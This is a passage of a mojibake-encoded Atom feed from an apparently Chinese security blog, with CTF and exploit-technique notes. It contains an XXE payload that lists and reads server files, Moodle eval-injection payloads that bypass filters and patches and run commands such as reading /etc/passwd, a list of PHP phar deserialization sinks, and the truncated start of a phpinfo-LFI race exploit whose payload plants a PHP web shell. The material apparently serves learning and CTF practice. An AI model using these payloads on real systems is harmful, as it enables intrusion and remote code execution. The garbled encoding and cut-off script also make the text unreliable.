class="line">&lt;age&gt;&amp;xxe;&lt;/age&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></p><p>å“åº”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 169</span><br><span class="line">Date: Fri, 16 Nov 2018 16:46:04 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Received name: name, age: .dockerenv</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">docker-java-home</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">flagvvvvvaaaagegsgag2333</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure></p><p>è¯»å–<code>flagvvvvvaaaagegsgag2333</code></p><p>è¯·æ±‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /www/ HTTP/1.1</span><br><span class="line">Host: 210.32.4.21:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://210.32.4.21:8080/www/index.html</span><br><span class="line">Content-Type: application/xml; charset=UTF-8</span><br><span class="line">Content-Length: 171</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///flagvvvvvaaaagegsgag2333&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;name&lt;/name&gt;</span><br><span class="line">&lt;age&gt;&amp;xxe;&lt;/age&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>å“åº”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 64</span><br><span class="line">Date: Fri, 16 Nov 2018 16:47:38 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Received name: name, age: EIS&#123;f501e9c5323c560b0a40192ce9b7ad38&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SimpleBBS&quot;&gt;&lt;a href=&quot;#SimpleBBS&quot; class=&quot;headerlink&quot; title=&quot;SimpleBBS&quot;&gt;&lt;/a&gt;SimpleBBS&lt;/h2&gt;&lt;h3 id=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;a href=&quot;#é¢˜ç›®æè¿°&quot; class=&quot;headerli
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2018æœ€æ–°PHPæ¼æ´åˆ©ç”¨æŠ€å·§</title>
    <link href="http://zer0yu.github.io/2018/11/13/New-PHP-exploit-techniques/"/>
    <id>http://zer0yu.github.io/2018/11/13/New-PHP-exploit-techniques/</id>
    <published>2018-11-13T15:12:58.000Z</published>
    <updated>2018-11-13T15:24:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç»¼è¿°"><a href="#0x00-ç»¼è¿°" class="headerlink" title="0x00 ç»¼è¿°"></a>0x00 ç»¼è¿°</h2><p>æœ¬æ–‡å­¦ä¹ äº†å‡ ç§æ–°å¼çš„php exploitæ–¹æ³•ï¼Œåœ¨æ­¤åšä¸€ç¬”è®°</p><ul><li>æ–‡ä»¶åˆ é™¤æ¼æ´, unlink()</li><li>Phar ååºåˆ—åŒ–, file*()</li><li>PHPå¯¹è±¡å®ä¾‹åŒ–, ReflectionClass()</li></ul><h2 id="0x01-WordPress-Design-Flaw-Leads-to-WooCommerce-RCE"><a href="#0x01-WordPress-Design-Flaw-Leads-to-WooCommerce-RCE" class="headerlink" title="0x01 WordPress Design Flaw Leads to WooCommerce RCE"></a>0x01 WordPress Design Flaw Leads to WooCommerce RCE</h2><p>WooCommerce 3.4.6æœ¬ç‰ˆæœ¬ä¹‹å‰å­˜åœ¨ä»»æ„åˆ é™¤æ¼æ´ï¼Œå› ä¸ºWordPressçš„è®¾è®¡ç¼ºé™·å°†å¯¼è‡´æ•´ç«™è¢«æ¥ç®¡ã€‚</p><p>è®¾è®¡ç¼ºé™·:</p><ul><li>WooCommerceæ’ä»¶è¢«å…³é—­ä¹‹åedit_usersæƒé™ä¾æ—§å­˜åœ¨</li><li>ä½†æ˜¯æ’ä»¶çš„disallow_editing_of_adminsè¿‡æ»¤å™¨ä¸ä¼šå†è¢«è§¦å‘</li><li>ä¸€èˆ¬åªæœ‰administratorså¯ä»¥å…³é—­æ’ä»¶ï¼Œï¼ˆä½†æ˜¯æˆ‘ä»¬è¿™é‡Œæœ‰ä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œç›¸å½“äºå…³é—­äº†æ’ä»¶ï¼‰</li></ul><p>å‚è€ƒï¼š<br><a href="https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/</a></p><h2 id="0x02-Moodle-lt-3-5-0"><a href="#0x02-Moodle-lt-3-5-0" class="headerlink" title="0x02 Moodle &lt; 3.5.0"></a>0x02 Moodle &lt; 3.5.0</h2><p>Code Injection</p><p>é¦–å…ˆï¼Œæ•™å¸ˆè§’è‰²æ˜¯å¿…é¡»çš„(å¯ä»¥åˆ©ç”¨xsså¾—åˆ°)</p><p>ä½¿ç”¨äº†evalå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">substitute_variables_and_eval</span><span class="params">($str, $dataset)</span> </span>&#123;</span><br><span class="line"><span class="comment">// substitues &#123;x&#125; and &#123;y&#125; for numbers like 1.2 with str_replace():</span></span><br><span class="line">        $formula = <span class="keyword">$this</span>-&gt;substitute_variables($str, $dataset);  </span><br><span class="line">        <span class="keyword">if</span> ($error = qtype_calculated_find_formula_errors($formula)) &#123;     </span><br><span class="line">            <span class="keyword">return</span> $error;<span class="comment">// formula security mechanism</span></span><br><span class="line">        &#125;</span><br><span class="line">        $str=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'$str = '</span>.$formula.<span class="string">';'</span>);<span class="comment">// dangerous eval()-call</span></span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æœ‰è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qtype_calculated_find_formula_errors</span><span class="params">($formula)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Returns false if everything is alright</span></span><br><span class="line">    <span class="comment">// otherwise it constructs an error message.</span></span><br><span class="line">    <span class="comment">// Strip away dataset names.</span></span><br><span class="line">    <span class="keyword">while</span> (preg_match(<span class="string">'~\\&#123;[[:alpha:]][^&gt;&#125; &lt;&#123;"\']*\\&#125;~'</span>, $formula, $regs))&#123;</span><br><span class="line">        $formula = str_replace($regs[<span class="number">0</span>], <span class="string">'1'</span>, $formula);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Strip away empty space and lowercase it.</span></span><br><span class="line">    $formula = strtolower(str_replace(<span class="string">' '</span>, <span class="string">''</span>, $formula));</span><br><span class="line"></span><br><span class="line">    $safeoperatorchar = <span class="string">'-+/*%&gt;:^\~&lt;?=&amp;|!'</span>; <span class="comment">/* */</span></span><br><span class="line">    $operatorornumber = <span class="string">"[&#123;$safeoperatorchar&#125;.0-9eE]"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"~[^&#123;$safeoperatorchar&#125;.0-9eE]+~"</span>, $formula, $regs)) &#123;</span><br><span class="line">        <span class="keyword">return</span> get_string(<span class="string">'illegalformulasyntax'</span>,<span class="string">'qtype_calculated'</span>,$regs[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Formula just might be valid.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bypassè¿‡æ»¤<br><a href="https://i.loli.net/2018/11/13/5beaccdb43658.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/13/5beaccdb43658.png" alt="å±å¹•å¿«ç…§ 2018-11-13 ä¸‹åˆ9.06.43.png"></a></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.&#123;a.`$_GET[0]`&#125;</span><br><span class="line">2. /*&#123;a*/`$_GET[0]`;//&#123;x&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; 0=(date;cat/etc/passwd)&gt;../hi.txt</span><br></pre></td></tr></table></figure><p><strong>bypasså®˜æ–¹è¡¥ä¸</strong></p><p>1.Blacklist</p><p>è¡¥ä¸è¯´æ˜:å¾ªç¯æ£€æµ‹è¾“å…¥ä¸­æ˜¯å¦å­˜åœ¨//,/*,#<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qtype_calculated_find_formula_errors</span><span class="params">($formula)</span> </span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> ([<span class="string">'//'</span>, <span class="string">'/*'</span>, <span class="string">'#'</span>] <span class="keyword">as</span> $commentstart) &#123;</span><br><span class="line"><span class="keyword">if</span> (strpos($formula, $commentstart) !== <span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> get_string(<span class="string">'illegalformulasyntax'</span>,</span><br><span class="line">  <span class="string">'qtype_calculated'</span>, </span><br><span class="line">   $commentstart);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1?&gt;&lt;?=log(1)&#123;a.`$_GET[0]`.(&#123;x&#125;)&#125;?&gt;</span><br></pre></td></tr></table></figure><p>2.æ‹’ç»ä½¿ç”¨å ä½ç¬¦åµŒå¥—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find_dataset_names</span><span class="params">($text)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Returns the possible dataset names found in the text as an array.</span></span><br><span class="line"><span class="comment">// The array has the dataset name for both key and value.</span></span><br><span class="line"><span class="keyword">if</span> (preg_match_all(<span class="string">'~\\&#123;([[:alpha:]][^&gt;&#125; &lt;&#123;"\']*)\\&#125;~'</span>,$text,$regs)) &#123;</span><br><span class="line">$datasetnames = array_unique($regs[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span> array_combine($datasetnames, $datasetnames);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qtype_calculated_find_formula_errors</span><span class="params">($formula)</span> </span>&#123;</span><br><span class="line">    $datasetnames = find_dataset_names($formula);</span><br><span class="line">    <span class="keyword">foreach</span> ($datasetnames <span class="keyword">as</span> $datasetname) &#123;</span><br><span class="line">        $formula = str_replace(<span class="string">'&#123;'</span>.$datasetname.<span class="string">'&#125;'</span>, <span class="string">'1'</span>, $formula);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*&#123;x&#125;&#123;a*/</span>`$_GET[<span class="number">0</span>]`<span class="comment">/*(1)//&#125;&#123;a*/</span>`$_GET[<span class="number">0</span>]`<span class="comment">/*(&#123;x&#125;)//&#125;*/</span></span><br></pre></td></tr></table></figure><p>3.é»‘åå•+çº¿æ€§æ›¿æ¢</p><p>æ§åˆ¶xmlå®ç°</p><p>å‚è€ƒ:</p><p><a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/moodle-remote-code-execution/</a></p><h2 id="0x03-WordPress-File-Delete-to-Code-Execution"><a href="#0x03-WordPress-File-Delete-to-Code-Execution" class="headerlink" title="0x03 WordPress File Delete to Code Execution"></a>0x03 WordPress File Delete to Code Execution</h2><p>å½±å“èŒƒå›´: =&lt;4.9.6</p><p>å‰æ:æ‹¥æœ‰åª’ä½“æ–‡ä»¶çš„åˆ é™¤æƒé™(åªèƒ½åˆ©ç”¨å…¶å®ƒæ¼æ´æˆ–è€…é”™è¯¯é…ç½®æ¥å–å¾—)</p><p>åˆ é™¤ç›®æ ‡:</p><p><code>.htaccess</code> æœ‰æ—¶å…¶ä¸­ä¼šåŒ…å«ä¸€äº›å®‰å…¨ç­–ç•¥(æ¯”å¦‚:è®¿é—®æŸäº›æ–‡ä»¶å¤¹çš„æƒé™)ï¼Œåˆ é™¤åä¼šæ˜¯å®‰å…¨ç­–ç•¥æ— æ•ˆã€‚</p><p><code>index.php files</code> ä¸€èˆ¬è¿™ä¸ªæ–‡ä»¶æ˜¯ç©ºçš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢åˆ—ç›®å½•ï¼Œè¢«åˆ é™¤äº†å°±æœ‰å¯èƒ½å»åˆ—ç›®å½•äº†ã€‚</p><p><code>wp-config.php</code> è¿™ä¸ªåˆ é™¤äº†ï¼ŒWordPresså°±è¦è¢«é‡è£…äº†ã€‚</p><p>å‚è€ƒ:<a href="https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</a></p><h2 id="0x04-Phar-Deserialization"><a href="#0x04-Phar-Deserialization" class="headerlink" title="0x04 Phar:// Deserialization"></a>0x04 Phar:// Deserialization</h2><p>æ•æ„Ÿç‚¹:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">file_get_contents(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">file_put_contents(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</span><br><span class="line">copy(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">file_get_contents(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">file_put_contents(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</span><br><span class="line">copy(<span class="string">'phar://test.phar'</span>, <span class="string">''</span>);</span><br><span class="line">file_exists(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">is_executable(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">is_file(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">is_dir(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">is_link(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">is_writable(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">fileperms(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">fileinode(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">filesize(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">fileowner(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">filegroup(<span class="string">'phar://test.phar'</span>); fileatime(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">filemtime(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">filectime(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">filetype(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">getimagesize(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">exif_read_data(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">stat(<span class="string">'phar://test.phar'</span>); </span><br><span class="line">lstat(<span class="string">'phar://test.phar'</span>);</span><br><span class="line">touch(<span class="string">'phar://test.pharâ€˜);</span></span><br><span class="line"><span class="string">md5_file('</span>phar:<span class="comment">//test.phar');</span></span><br></pre></td></tr></table></figure></p><p>å¯ä»¥å‚è€ƒ:</p><p><a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/new-php-exploitation-technique/</a></p><p><a href="http://seaii-blog.com/index.php/2018/08/23/86.html" target="_blank" rel="noopener">http://seaii-blog.com/index.php/2018/08/23/86.html</a></p><p><a href="https://www.anquanke.com/post/id/157657" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157657</a></p><p><a href="https://www.anquanke.com/post/id/157439" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157439</a></p><h2 id="0x05-Shopware-lt-5-3-4-PHP-Object-Instantiation-to-XXE-to-RCE"><a href="#0x05-Shopware-lt-5-3-4-PHP-Object-Instantiation-to-XXE-to-RCE" class="headerlink" title="0x05 Shopware &lt; 5.3.4 PHP Object Instantiation to XXE to RCE"></a>0x05 Shopware &lt; 5.3.4 PHP Object Instantiation to XXE to RCE</h2><p>å½±å“èŒƒå›´:Shopware version &lt;= 5.3.3 and &gt;= 5.1</p><p>XSSâ†’POIâ†’XMLiâ†’XXEâ†’PHARâ†’POIâ†’POPâ†’RCE</p><p>å‚è€ƒ:<br><a href="https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/" target="_blank" rel="noopener">https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/</a></p><p>çªç„¶å‘ç°æœ‰äººç¿»è¯‘è¿‡<br><a href="https://www.freebuf.com/vuls/154415.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/154415.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-ç»¼è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç»¼è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00 ç»¼è¿°&quot;&gt;&lt;/a&gt;0x00 ç»¼è¿°&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡å­¦ä¹ äº†å‡ ç§æ–°å¼çš„php exploitæ–¹æ³•ï¼Œåœ¨æ­¤åšä¸€ç¬”è®°&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ–‡ä»¶åˆ é™¤æ¼æ´
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>phpinfoå¯ä»¥å‘Šè¯‰æˆ‘ä»¬ä»€ä¹ˆ</title>
    <link href="http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/"/>
    <id>http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/</id>
    <published>2018-11-12T16:09:33.000Z</published>
    <updated>2018-11-16T08:32:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-åŸºæœ¬ä¿¡æ¯"><a href="#0x00-åŸºæœ¬ä¿¡æ¯" class="headerlink" title="0x00 åŸºæœ¬ä¿¡æ¯"></a>0x00 åŸºæœ¬ä¿¡æ¯</h2><h3 id="system-info"><a href="#system-info" class="headerlink" title="system info"></a>system info</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/HE8cH44f3e.png" alt="image"></p><p>è¯¦ç»†çš„æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼Œä¸ºææƒåšå‡†å¤‡</p><h3 id="extension-dir"><a href="#extension-dir" class="headerlink" title="extension_dir"></a>extension_dir</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/BjlfKkaFAg.png" alt="image"><br>phpæ‰©å±•çš„è·¯å¾„</p><h3 id="çœŸå®ip"><a href="#çœŸå®ip" class="headerlink" title="çœŸå®ip"></a>çœŸå®ip</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/13al8a7Gl0.png" alt="image"><br>cdnä»€ä¹ˆçš„éƒ½ä¸å­˜åœ¨çš„ï¼Œæ‰¾åˆ°çœŸå®ipï¼Œæ‰«ä¸€æ‰«æ—ç«™ï¼Œæ²¡å‡†å°±æ‹¿ä¸‹å‡ ä¸ªç«™ã€‚</p><h3 id="webæ ¹ç›®å½•"><a href="#webæ ¹ç›®å½•" class="headerlink" title="webæ ¹ç›®å½•"></a>webæ ¹ç›®å½•</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/4BibE1a8mJ.png" alt="image"></p><h3 id="ä¸´æ—¶æ–‡ä»¶è·¯å¾„"><a href="#ä¸´æ—¶æ–‡ä»¶è·¯å¾„" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶è·¯å¾„"></a>ä¸´æ—¶æ–‡ä»¶è·¯å¾„</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/81AcH81K8j.png" alt="image"><br>å‘phpinfo()é¡µé¢postä¸€ä¸ªshellï¼ˆè‡ªå·±å†™ä¸€ä¸ªä¸Šä¼ é¡µé¢ï¼‰ï¼Œå¯ä»¥åœ¨_FILES[â€œfile1â€]ä¸­çœ‹åˆ°ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœæœ‰ä¸ªlfiï¼Œä¾¿å¯ä»¥ç›´æ¥getshelläº†ã€‚</p><p>phpinfo-lfi<br>åˆ©ç”¨è„šæœ¬<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit </span></span><br><span class="line"><span class="comment"># Alternative way to easy_php @ N1CTF2018, solved by intrd &amp; shrimpgo - p4f team</span></span><br><span class="line"><span class="comment"># @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## passwords.txt payload content</span></span><br><span class="line"><span class="comment"># &lt;?php $c=fopen('/app/intrd','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?&gt;');?&gt;</span></span><br><span class="line"></span><br><span class="line">import sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re</span><br><span class="line">from subprocess import Popen, PIPE, STDOUT</span><br><span class="line"></span><br><span class="line">NumOfThreads=<span class="number">50</span></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line"></span><br><span class="line">class checkHash(threading.Thread):</span><br><span class="line">def __init__(<span class="keyword">self</span>,queue):</span><br><span class="line">threading.Thread.__init__(<span class="keyword">self</span>)</span><br><span class="line"><span class="keyword">self</span>.queue=queue</span><br><span class="line">def run(<span class="keyword">self</span>):</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">self</span>.clear=<span class="keyword">self</span>.queue.get()</span><br><span class="line">passtry = <span class="keyword">self</span>.clear</span><br><span class="line"><span class="keyword">if</span> passtry != <span class="string">""</span>:</span><br><span class="line"></span><br><span class="line">padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: <span class="string">'o99quh47clk8br394298tkv5o0'</span>,</span><br><span class="line">    <span class="string">'othercookie'</span>: padding</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: padding,</span><br><span class="line">    <span class="string">'Pragma'</span>: padding,</span><br><span class="line">    <span class="string">'Accept'</span>: padding,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: padding,</span><br><span class="line">    <span class="string">'DNT'</span>: <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'arquivo'</span>: open(<span class="string">'passwords.txt'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line">reqs=<span class="string">'http://47.97.221.96:23333/index.php?action=../../var/www/phpinfo/index.php&amp;a='</span>+padding</span><br><span class="line"><span 